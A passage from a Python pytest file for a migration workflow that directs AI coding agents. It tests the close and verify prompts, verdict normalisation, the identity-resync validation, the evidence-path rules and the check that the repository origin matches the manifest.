    prompt = ns["close_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1", "pr_head": "c" * 40}], 10)
    assert "one Devin Review round" in prompt and "review_findings" in prompt and "not a merge blocker" in prompt
    review_only = ns["close_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1", "pr_head": "c" * 40}],
                                     10, merge=False)
    assert "Do not merge anything" in review_only and "one Devin Review round" in review_only
    assert "Merge exactly these PRs" not in review_only
    tree = _tree()
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CLOSE_SCHEMA" for t in n.targets))
    assert schema["properties"]["review_findings"] == {"type": "array", "items": {"type": "string"}}
    assert "review_findings" not in schema["required"]


# ---------------------------------------------------------------- G3: verifier verdicts keyed by batch or unit


def _verify(verdicts, passed):
    return _functions()["validate_verify"]({"wave_verdict": "PASS", "unit_verdicts": verdicts, "findings": [],
                                            "changed_paths": []}, passed)


def test_validate_verify_normalises_unit_keys_to_batch_ids_for_any_batch_size():
    passed = [{"batch": "w2-b03", "units": ["orders", "lines"], "pr_url": "https://example/pr/3"},
              {"batch": "w2-b04", "units": ["fees"], "pr_url": "https://example/pr/4"}]
    assert _verify({"orders": "PASS", "lines": "PASS", "fees": "PASS"}, passed) == []
    assert _verify({"w2-b03": "PASS", "fees": "PASS"}, passed) == []
    assert _verify({"orders": "PASS", "w2-b04": "PASS"}, passed) == []
    assert _verify({"w2-b03": "PASS", "orders": "PASS", "lines": "PASS", "fees": "PASS"}, passed) == []
    missing = _verify({"orders": "PASS"}, passed)
    assert missing == ["verifier output invalid: missing verdicts for w2-b04"]
    extra = _verify({"orders": "PASS", "fees": "PASS", "lg": "PASS"}, passed)
    assert extra == ["verifier output invalid: unexpected verdicts for lg"]


def test_validate_verify_fails_only_a_real_collision_after_normalisation():
    passed = [{"batch": "w2-b03", "units": ["orders", "lines"], "pr_url": "https://example/pr/3"}]
    problems = _verify({"orders": "PASS", "lines": "FAIL"}, passed)
    assert any("conflicting verdicts for w2-b03" in p and "orders=PASS" in p and "lines=FAIL" in p for p in problems)
    assert not any("unexpected verdicts" in p for p in problems)
    problems = _verify({"w2-b03": "FAIL", "orders": "PASS"}, passed)
    assert any("conflicting verdicts for w2-b03" in p for p in problems)
    # a unit id that is also a batch id is read as the batch
    passed = [{"batch": "orders", "units": ["orders"], "pr_url": "https://example/pr/3"}]
    assert _verify({"orders": "PASS"}, passed) == []


def test_batch_verdicts_is_what_main_reads_for_merges():
    batch_verdicts = _functions()["batch_verdicts"]
    passed = [{"batch": "w2-b03", "units": ["orders", "lines"]}, {"batch": "w2-b04", "units": ["fees"]}]
    assert batch_verdicts({"orders": "PASS", "lines": "PASS", "w2-b04": "FAIL"}, passed) == {"w2-b03": "PASS", "w2-b04": "FAIL"}
    assert batch_verdicts({"orders": "PASS", "lines": "FAIL"}, passed) == {"w2-b03": None}
    assert batch_verdicts("nope", passed) == {}


def test_verifier_prompt_and_schema_say_verdicts_are_normalised_to_batch_ids():
    ns = _prompt_ns(_manifest())
    text = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1"}])
    assert "unit_verdicts" in text and "batch id" in text and "unit id" in text and "normalis" in text
    tree = _tree()
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "VERIFY_SCHEMA" for t in n.targets))
    desc = schema["properties"]["unit_verdicts"]["description"]
    assert "batch id" in desc and "unit id" in desc and "PASS" in desc


# ---------------------------------------------------------------- G3: identity resync step and selective replay


def test_validate_manifest_accepts_and_checks_the_optional_resync_block():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(resync={"command": "python3 load/resync_identity.py --unit u", "units": ["u"]}))
    for bad, why in (("run it", "resync"), ({"command": "x"}, "resync"), ({"units": ["u"]}, "resync"),
                     ({"command": "", "units": ["u"]}, "command"), ({"command": "x", "units": []}, "units"),
                     ({"command": "x", "units": ["ghost"]}, "ghost"), ({"command": "x", "units": "u"}, "units"),
                     ({"command": "x", "units": ["u"], "sql": "setval"}, "resync")):
        with pytest.raises(SystemExit, match=why):
            validate_manifest(_manifest(resync=bad))


def _resync_ns():
    tree = _tree()
    names = {"resync_prompt", "validate_resync"}
    selected = [n for n in tree.body if (isinstance(n, ast.FunctionDef) and n.name in names)
                or (isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id in {"RESYNC_CLASS", "RESYNC_SCHEMA"}
                                                       for t in n.targets))]
    ns = {"json": json, "re": re, "WAVE": 1, "REPO": "github.com/acme/target", "BASE_BRANCH": "migration/x",
          "MANIFEST": _manifest(resync={"command": "python3 load/resync_identity.py --unit u", "units": ["u"]})}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    return ns


def test_resync_prompt_runs_exactly_the_command_and_commits_nothing():
    ns = _resync_ns()
    text = ns["resync_prompt"](ns["MANIFEST"]["resync"])
    assert "python3 load/resync_identity.py --unit u" in text and "migration/x" in text and "repo root" in text
    assert "setval" in text and "identity" in text and '"u"' in text
    assert "by name" in text and "commit nothing" in text.lower() and "allowlist" in text
    assert "before" in text and "after" in text and "sequences" in text
    schema = ns["RESYNC_SCHEMA"]
    assert schema["properties"]["sequences"]["items"]["required"] == ["object", "before", "after"]
    assert set(schema["required"]) == {"status", "sequences", "changed_paths", "one_line_summary"}


def test_validate_resync_rejects_writes_and_objects_outside_the_listed_units():
    validate_resync = _resync_ns()["validate_resync"]
    ok = {"status": "ok", "sequences": [{"object": "mig.u.orders_id_seq", "before": 10, "after": 42}],
          "changed_paths": [], "one_line_summary": "reseeded"}
    assert validate_resync(ok) == []
    assert "expected an object" in validate_resync([])[0]
    assert any("changed src/x.sql" in p for p in validate_resync({**ok, "changed_paths": ["src/x.sql"]}))
    assert any("sequences" in p for p in validate_resync({**ok, "sequences": [{"object": "s"}]}))
    assert any("status" in p for p in validate_resync({**ok, "status": "done"}))
    failed = {"status": "failed", "sequences": [], "changed_paths": [], "one_line_summary": "setval exited 1"}
    assert any("resync command failed" in p for p in validate_resync(failed))
    assert validate_resync({**ok, "sequences": []}) == []


@pytest.mark.parametrize("value", [0, True, "10", 61])
def test_validate_manifest_rejects_a_bad_close_minutes(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="close_minutes"):
        validate_manifest(_manifest(close_minutes=value))
    validate_manifest(_manifest(close_minutes=10))
    validate_manifest(_manifest(close_minutes=60))


def test_validate_close_lists_each_verified_pr_in_exactly_one_bucket_and_nothing_else():
    validate_close = _functions()["validate_close"]
    to_merge = [{"batch": "b1", "pr_url": "u1"}, {"batch": "b2", "pr_url": "u2"}]
    row = lambda url: {"pr_url": url, "merge_commit_sha": "a" * 40, "merged_head": "b" * 40}
    ok = {"merged_prs": [row("u1")], "unmerged": [{"pr_url": "u2", "reason": "head moved"}],
          "changed_paths": []}
    assert validate_close(ok, to_merge) == []
    assert any("merged with auto_merge off" in p for p in validate_close(ok, to_merge, merge=False))
    assert "expected an object" in validate_close([], to_merge)[0]
    problems = validate_close({**ok, "merged_prs": ["u1"]}, to_merge)
    assert any("merged_prs rows must be" in p for p in problems)
    problems = validate_close({**ok, "merged_prs": [row("u1"), row("foreign")]}, to_merge)
    assert any("outside the wave" in p and "foreign" in p for p in problems)
    problems = validate_close({"merged_prs": [], "unmerged": [], "changed_paths": []}, to_merge)
    assert len([p for p in problems if "u1" in p or "u2" in p]) == 2
    problems = validate_close({**ok, "merged_prs": [row("u1"), row("u2")],
                               "unmerged": [{"pr_url": "u2", "reason": "x"}]}, to_merge)
    assert any("u2" in p for p in problems)
    problems = validate_close({**ok, "changed_paths": ["src/x.sql"]}, to_merge)
    assert any("changed src/x.sql" in p for p in problems)


def test_close_prompt_names_the_deadline_and_forbids_writes():
    ns = _prompt_ns(_manifest())
    prompt = ns["close_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1", "pr_head": "c" * 40}], 10)
    assert "10 minutes" in prompt and "Write nothing" in prompt and "https://example/pr/1" in prompt
    assert "recon/" not in prompt


# ---------------------------------------------------------------- structured evidence and decisions (PR 2)

def test_gate_evidence_may_carry_its_annotation_beside_the_path_never_inside_it():
    """Yesterday's relaunch: a child wrote `path (rows matched)` and the string was checked as a path."""
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(gates=[
        {"id": "g-rows", "status": "passed",
         "evidence": {"path": ".migration/recon/u/rows.md", "label": "row parity", "verdict": "PASS", "rows": 1204}}]))
    assert out["status"] == "PASS", out.get("one_line_summary")
    assert out["gates"] == [{**GATE, "status": "passed", "evidence": ".migration/recon/u/rows.md", "decision_id": None,
                             "evidence_meta": {"label": "row parity", "verdict": "PASS", "rows": 1204}}]
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(gates=[
        {"id": "g-rows", "status": "passed", "evidence": ".migration/recon/u/rows.md (rows matched)"}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    assert "bare path" in out["one_line_summary"] and "{path, label}" in out["one_line_summary"]


@pytest.mark.parametrize("evidence", [
    {"path": ".migration/recon/u/rows.md", "note": "x"},         # not a known annotation
    {"path": ".migration/recon/u/rows.md", "rows": "1204"},      # rows is a count
    {"path": ".migration/recon/u/rows.md", "rows": True},
    {"label": "row parity"},                                      # no path
    {"path": ["a"]},
    {"path": ""},
    ["path"],
    None,
])
def test_evidence_objects_are_path_plus_known_annotations_only(evidence):
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": evidence}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"


def test_evidence_path_reads_a_string_or_a_path_object():
    evidence_path = _batch_runtime()["evidence_path"]
    assert evidence_path("a/b") == "a/b"
    assert evidence_path({"path": "a/b", "label": "L", "verdict": "PASS", "rows": 0}) == "a/b"
    assert evidence_path({"path": "a/b", "rows": 1.5}) is None
    assert evidence_path({"path": "a/b", "other": 1}) is None
    assert evidence_path(3) is None


def test_child_schema_accepts_both_evidence_forms():
    tree = _tree()
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))
    evidence = schema["properties"]["gates"]["items"]["properties"]["evidence"]
    forms = {json.dumps(f, sort_keys=True) for f in evidence["anyOf"]}
    assert {"type": "string"} in evidence["anyOf"]
    obj = next(f for f in evidence["anyOf"] if f.get("type") == "object")
    assert obj["required"] == ["path"] and set(obj["properties"]) == {"path", "label", "verdict", "rows"}
    assert len(forms) == 2


@pytest.mark.parametrize("origin", [
    "https://github.com/acme/target.git\n",
    "https://github.com/Acme/Target",
    "git@github.com:acme/target.git",
    "ssh://git@github.com/acme/target/",
    "https://user@github.com/acme/target.git",
    "ssh://git@github.com:2222/acme/target.git",   # an explicit port is not part of the repo
    "https://github.com:443/acme/target",
    "/tmp/mirrors/origin.git",           # a local mirror has no host to compare
    "file:///tmp/mirrors/origin.git",
])
def test_check_repo_origin_accepts_origin_at_the_manifests_repo(origin):
    _functions()["check_repo_origin"]("github.com/acme/target", origin)


@pytest.mark.parametrize("origin", [
    "https://github.com/acme/other.git",
    "https://ghe.acme.com/acme/target.git",
    "git@github.com:acme/target-fork.git",
    "ssh://git@ghe.acme.com:2222/acme/target.git",
])
def test_check_repo_origin_halts_when_children_would_open_prs_elsewhere(origin):
    with pytest.raises(SystemExit, match="manifest 'repo'"):
        _functions()["check_repo_origin"]("github.com/acme/target", origin)


@pytest.mark.parametrize("repo", ["target", "acme/target", "https://github.com/acme/target", "github.com/acme/target/pull"])
def test_validate_manifest_requires_a_host_owner_name_repo(repo):
    with pytest.raises(SystemExit, match="host/owner/name"):
        _functions()["validate_manifest"](_manifest(repo=repo))


def test_validate_manifest_rejects_declared_evidence_that_is_not_a_bare_path():
    gates = [{"id": "g-p", "kind": "custom", "status": "passed", "evidence": "recon/u/result.json (checked)"}]
    with pytest.raises(SystemExit, match="bare path"):
        _functions()["validate_manifest"](_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "x", "gates": gates}]))
